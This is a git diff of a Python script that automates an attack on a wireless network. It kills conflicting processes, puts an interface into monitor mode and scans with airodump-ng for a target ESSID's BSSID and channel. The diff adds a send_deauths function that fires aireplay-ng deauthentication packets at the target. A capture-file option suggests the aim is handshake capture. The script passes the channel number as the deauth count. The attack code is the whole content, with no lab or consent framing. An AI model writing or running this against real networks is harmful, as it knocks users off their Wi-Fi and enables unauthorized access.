@@ -1,18 +1,20 @@
 import argparse
 import logging
-import threading
 import subprocess
-import tempfile
 import time
 import os
 import re
-import signal
 from pathlib import Path
 from typing import Optional
 import pty
-import subprocess
 import select
-import sys
+from typing import Optional, Dict, Any
+
+def send_deauths(iface: str, mac_address: str, channel: str): 
+    print('Inside send_deauths')
+    cmd = ["sudo", "aireplay-ng", "--deauth", channel, "-a", mac_address, iface]
+    result = subprocess.run(cmd, capture_output=True, text=True)
+    print(result.stdout)
 
 def kill_conflicting_processes():
     subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True, text=True, check=True)
@@ -33,65 +35,97 @@ def enable_monitor_mode(iface: str) -> str:
     result = subprocess.run(cmd, capture_output=True, text=True, check=True)
     print(result);
 
-def find_bssid(essid: str, iface: str = "wlan0mon", timeout: Optional[int] = None) -> Optional[str]:
-    master_fd, slave_fd = pty.openpty()
+def find_network(
+    essid: str,
+    iface: str = "wlan0mon",
+    timeout: Optional[int] = None
+) -> Optional[Dict[str, Any]]:
+    """
+    Scan with airodump‑ng until *essid* appears and return its BSSID and channel.
+    Returns: {"bssid": "<mac>", "channel": <int>}  or  None if not found/timeout.
+    """
+    print(f"Looking for ESSID: {essid}")
+    print(f"Interface: {iface}")
+    print(f"Timeout: {timeout if timeout else 'No timeout'} s")
 
-    process = subprocess.Popen(
+    master_fd, slave_fd = pty.openpty()
+    proc = subprocess.Popen(
         ["sudo", "airodump-ng", iface],
         stdout=slave_fd,
         stderr=subprocess.STDOUT,
-        text=False  # we decode manually
+        text=False          # raw bytes – we’ll decode ourselves
     )
-
     os.close(slave_fd)
 
-    buffer = ""
-    start_time = time.time()
+    buf = ""
+    start = time.time()
+    ch_col = None          # index of the “CH” column once we spot the header
 
     try:
-        while process.poll() is None:
-            # check whether we've timed out
-            if timeout and (time.time() - start_time) > timeout:
-                print("\nTimeout reached. Stopping scan.")
+        while proc.poll() is None:
+            if timeout and (time.time() - start) > timeout:
+                print("\nTimeout reached – stopping scan.")
                 break
 
-            # if we get here, we haven't timed out
             ready, _, _ = select.select([master_fd], [], [], 0.5)
-            if ready:
-                chunk = os.read(master_fd, 4096).decode(errors="replace")
-                buffer += chunk
+            if not ready:
+                continue
 
-                # Split buffer into lines and process them
-                lines = buffer.splitlines()
+            chunk = os.read(master_fd, 4096).decode(errors="replace")
+            buf += chunk
+            lines = buf.splitlines()
 
-                for line in lines:
-                    if essid in line:
-                        parts = line.split()
-                        # Heuristically look for BSSID
-                        if len(parts) >= 2:
-                            bssid_candidate = parts[0]
-                            if ":" in bssid_candidate and len(bssid_candidate) == 17:
-                                print(f"\nFound ESSID '{essid}' with BSSID: {bssid_candidate}")
-                                return bssid_candidate
-                # Prevent buffer from growing too big
-                if len(buffer) > 100000:
-                    buffer = buffer[-10000:]
+            for line in lines:
+                # 1️⃣  Pin down the header once so we know where “CH” lives
+                if ch_col is None and "BSSID" in line and "ESSID" in line and "CH" in line:
+                    header = re.split(r"\s+", line.strip())
+                    try:
+                        ch_col = header.index("CH") + 1
+                        # print(f"Header captured – CH is column {ch_col}")
+                    except ValueError:
+                        pass  # should not happen
+                    continue
+
+                # 2️⃣  Look for the target ESSID in each data row
+                if essid in line and ch_col is not None:
+                    parts = re.split(r"\s+", line.strip())
+
+                    # Guard against short/garbled rows
+                    if len(parts) <= ch_col:
+                        continue
+
+                    bssid = parts[0]
+                    chan_str = parts[ch_col]
+
+                    # Validate BSSID shape (aa:bb:cc:dd:ee:ff)
+                    if re.fullmatch(r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
+                        # Channel can be ‘1’, ‘6’, ‘149’, etc.
+                        if chan_str.isdigit():
+                            channel = int(chan_str)
+                        else:                         # strip odd suffixes (e.g. “6e”)
+                            channel = int(re.sub(r"\D", "", chan_str) or -1)
+
+                        print(f"\nFound '{essid}'  ➜  BSSID: {bssid} | CH: {channel}")
+                        # proc.terminate()
+                        # proc.wait()
+                        return {"bssid": bssid, "channel": channel}
+
+            # keep buffer from ballooning
+            if len(buf) > 100_000:
+                buf = buf[-10_000:]
+
     except KeyboardInterrupt:
-        print("\nInterrupted. Exiting...")
+        print("\nInterrupted by user.")
     finally:
         try:
-            process.terminate()
+            proc.terminate()
         except Exception:
             pass
-        process.wait()
+        proc.wait()
         os.close(master_fd)
 
     print("ESSID not found.")
     return None
-
-def send_deauth_packets(bssid: str):
-
-    return;
 
 def main():
     # Create argument parser
@@ -112,15 +146,16 @@ def main():
     logging.info("Interface: %s", args.interface)
     logging.info("Capture File: %s", args.capfile)
 
+    # TODO: make script smart enough to figure this out on its own
+    channel = 1
+
     kill_conflicting_processes()
     enable_monitor_mode(args.interface)
-    bssid = find_bssid(args.target, args.interface, 20)
+    network_info = find_network(args.target, args.interface, 20)
+    print(network_info)
     
-    if bssid:
-        print(f"✓ Got BSSID {bssid}; now I can continue…")
-        send_deauth_packets(bssid)
-    else:
-        print("✗ Network not seen — decide what to do next.")
+    if network_info:
+        send_deauths(args.interface, str(network_info['bssid']), str(network_info['channel']))
 
 if __name__ == "__main__":
     logging.basicConfig(
